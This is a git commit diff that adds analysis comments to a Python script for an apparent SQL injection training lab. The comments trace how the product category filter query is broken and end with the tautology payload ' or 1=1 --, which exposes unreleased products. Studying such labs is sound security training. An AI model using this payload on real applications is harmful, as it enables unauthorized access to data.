72072103b50bb14d33e6d3d46535683751b54350
sjbeazell <55643213+sjbeazell@users.noreply.github.com>
2021-11-15 18:14:43 -0500

    Update sqli-lab-01.py

--- sqli-lab-01.py
+++ sqli-lab-01.py
@@ -1,3 +1,21 @@
+#  SQL injection - product category filter 
+
+#  SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
+
+#  End goal: display all products both released and unreleased 
+
+#  Analysis:
+
+#  SELECT * FROM products WHERE category = 'Pets' AND released = 1 
+
+#  SELECT * FROM products WHERE category = ''' AND released = 1 
+
+#  SELECT * FROM products WHERE category = ''--' AND released = 1
+
+#  SELECT * FROM products WHERE category = ''
+
+#  SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1
+
 import requests
 import sys
 import urllib3
